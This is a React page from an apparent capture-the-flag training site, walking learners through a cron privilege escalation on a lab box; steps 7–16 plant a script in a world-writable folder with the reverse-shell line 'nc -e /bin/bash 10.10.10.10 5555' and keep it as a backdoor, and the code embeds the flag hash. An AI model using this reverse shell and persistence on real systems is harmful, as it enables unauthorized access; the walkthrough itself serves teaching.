import Link from 'next/link'
import {Card, CardPrimaryAction} from '@rmwc/card';
import {Typography} from '@rmwc/typography';
import {List, CollapsibleList,SimpleListItem} from '@rmwc/list';  
import {Icon, metaIcon } from '@rmwc/icon';
import {TextField} from '@rmwc/textfield'; 
import { Button } from '@rmwc/button';

import {useContext} from 'react';  
import { CheckboxContenxt} from './_app'; 

export default function cron() {
   const setcheckbox= useContext(CheckboxContenxt);  
    function  checkCode(code){

        if(code == "19d76e33d3ee316dc71bb1c33527ae80"){
         setcheckbox('cron'); 
        }
        else 
        {
            alert("Code is incorrect")
        }
    
    }
    return(
        <>
        <Card> 
            <CardPrimaryAction>
                <div style={{ padding: '1rem' }}>
                    <Typography use="headline5" tag="div">
                        CRON
                     </Typography>
                    <Typography use="body1" tag="p" theme="textSecondaryOnBackground">
            Cron is a time based job scheduler in Unix-like operating systems. People use them to set up and maintain software environments to schedule jobs. For 
            example running a script at specific times for a fixed amount of time. It is meant to automate system maintenence or administraiton. In this puzzle we will 
            use the this to get our flag. 
           
                 </Typography>
                </div>
            </CardPrimaryAction>
        </Card>

        <List>
            <p>Before starting this puzzle make sure that you have completed the previous puzzle. We will be using the shell from the previous puzzle.</p>
            
            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 1: Check the home directory " />      
            
                }
            >         
                 <SimpleListItem text = "This can be done with the 'ls /home' command " /> 
                 <SimpleListItem text = "This helps you get an idea of what users are on the machine and if they had any misconfigurations " /> 
            </CollapsibleList>
            
            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 2: Explore the bob user's directory " />      
            
                }
            >         
                 <SimpleListItem text = "Try  'cd /home/bob' then 'ls -lt'  to list all the files in a list " /> 
                 <SimpleListItem text = "This is to get an idea of what the bob user has in his directory" /> 
                 <SimpleListItem text = "You sould see bobs_notes, BOBS_SECRET_FLAG, bobs_scripts, run_bob_scripts.sh -- aside these are permissions. "  />
                    <p> A quick rundown of permissions are as follows: d|rwx|rwx|rwx the first section determines if it is a directory or a file. 
                        If there is a "d" the file is a directory (or folder) you may enter. The next 3 sections are all identical. 
                        r stands for read, if this is set the group may read the file/directory. w stands for write, if this is set the group may write to the file/directory. 
                        the final is x, or execute, this means the user may RUN the file, this is usually reserved for programs and scripts. You may have noticed there are 3 groups of this "rwx" permission, this this because they are set separately for 
                        the owner, group, and everyone else. For example, take a look at the following file permissions: -rwxrw-r--    If we split this, we get the following: -|rwx|rw-|r--    This means the file as it does not have a d. 
                        The owner of the file may read, write, and execute it. The group may read and write it. Everyone else can simply read it.</p>

            </CollapsibleList>

            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 3: We want to look at BOBS_SECRET_FLAG but we can't unless we become the bob user. So lets look inside the bobs_notes file" />      
            
                }
            >         
                 <SimpleListItem text = "Run the command 'cat bobs_notes" /> 
                 <SimpleListItem text = "We see mention of his scripts folder not being safe. Why is this? " /> 
            </CollapsibleList>

            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 4: Let's take a step back and check some basic linux files. The file we are checking is: /etc/crontab." />      
            
                }
            >         
                 <SimpleListItem text = "Run the command 'cat /etc/crontab' " /> 
                 <SimpleListItem text = "The crontab runs tasks on a set schedule" /> 
                 <SimpleListItem text = " Inside this file we see the following line at the bottom: '* * * * *     bob     /home/bob/run_bob_scripts.sh     '  " />
                 <p>This means that on every minute the /home/bob/run_bob_scripts.sh file is run AS the bob user. 
                    Instructions for the crontab can actually be seen in the file itself when it is printed.</p>
            </CollapsibleList>

            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 5: Lets check what this 'run_bob_script.sh ' really is. " />      
            
                }
            >         
                 <SimpleListItem text = "Run the command 'cat /home/bob/run_bob_scripts.sh" /> 
                 <SimpleListItem text = "We know the bob user is running this every minute, time to find out if we can abuse that. To do that, let's see what's in the file" /> 
            </CollapsibleList>

            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 6: Inside the file, we see that he is getting all the scripts from /home/bob/bobs_scripts and running them. We also know from step 2 that the 'bobs_scripts' directory is writeable by anyone." />      
            
                }
            >         
                 <SimpleListItem text = "This means we should be able to create a script and have it run by the 'bob' user in 1 minute." /> 

            </CollapsibleList>    

            
            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 7: Let's create a simple script in this bobs_scripts directory that will give us access to the bob directory. " />      
             
                }
            >         
                 <SimpleListItem text = "To do this, use nano or vim and create a file (we will use vim in this example, replace it with nano if you prefer): 'vim /home/bob/bobs_scripts/script.sh' " /> 
                 <SimpleListItem text = "In this file, let's put a single line. 'nc -e /bin/bash 10.10.10.10 5555 ' , save it  "  /> 
            </CollapsibleList>    

                
            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 8: We created the script and now we want to make it an executable file. " />      
             
                }
            >         
                 <SimpleListItem text = "It can't be run if it doesn't have the permissions" /> 
                 <SimpleListItem text = "Use the following command to do that: 'chmod +x /home/bob/bobs_scripts/script.sh' "/> 
            </CollapsibleList>         

                   <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 9: Open a netcat listener on the machine again " />      
             
                }
            >         
                 <SimpleListItem text = "This means creating a new command line different than the one we are currently working on. This time with port 55555." /> 
                 <SimpleListItem text = "Use the following command to do that: 'nc -nlvp 5555' "/> 
                 <SimpleListItem text = "After a minute you should get a message saying a connection has been established. If not, make sure you followed all the steps correctly! " />

            </CollapsibleList>   

            <CollapsibleList
             handle ={
                <SimpleListItem
                //   metaIcon ='/images/chevron_right.png'
                   text="Step 10: Type the following command in the terminal to spawn an interactive shell: *python -c ‘import pty; pty.spawn(“/bin/bash”);’ *" />      
             
                }
            >         
            </CollapsibleList> 

            <CollapsibleList
             handle ={
                <SimpleListItem
                //   metaIcon ='/images/chevron_right.png'
                   text="Step 11:  Press ctrl+z on your keyboard then enter the following command: stty raw -echo ; fg" />      
             
                }
            >         
            </CollapsibleList>     

            <CollapsibleList
             handle ={
                <SimpleListItem
                //   metaIcon ='/images/chevron_right.png'
                   text="Step 12: Run the command 'reset', if it asks for a term type 'xterm' " />      
             
                }
            >         
            </CollapsibleList>   

            <CollapsibleList
             handle ={
                <SimpleListItem
                    metaIcon ='/images/chevron_right.png'
                   text="Step 13: Run the command: export TERM=xterm-256color" />      
             
                }
            >    
            <SimpleListItem text = "You may now try running commands such as 'vim, ls, clear' and they will all function properly " />     
            </CollapsibleList>      

            <CollapsibleList
             handle ={
                <SimpleListItem
                //   metaIcon ='/images/chevron_right.png'
                   text=" Step 14: Run 'whoami' to see what user we are --- we should be 'bob' now! " />      
             
                }
            >         
            </CollapsibleList>     
            
            
            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 15: Open the 'BOBS_SECRET_FLAG' file now that we have the proper permissions! " />      
             
                }
            >         
             <SimpleListItem text = " this can be done with 'cat /home/bob/BOBS_SECRET_FLAG'" />
            </CollapsibleList>

            <CollapsibleList
             handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 16: Save this terminal for the final puzzle " />      
             
                }
            >         
             <SimpleListItem text = "If you close it, that's fine! You can start from step 9 because we already have the script in place! It won't go anywhere unless the box restarts. That's the dangers of backdoors! Once they're in place, unless someone deletes them they're stuck around forever." />
            </CollapsibleList>

            <div className="flagCode">
            <TextField id = "code" label = "Flag Code" style={{ width: '20%' ,background: 'lightblue'}} />
            <Button label="Submit"  unelevated  style={{background:'White' , color:'black', height: '40px', width: '40px'}} 
             onClick={() => checkCode(document.getElementById("code").value)} />
         
            </div>


        </List>


        </>
        
      
    )    
    
   

  }
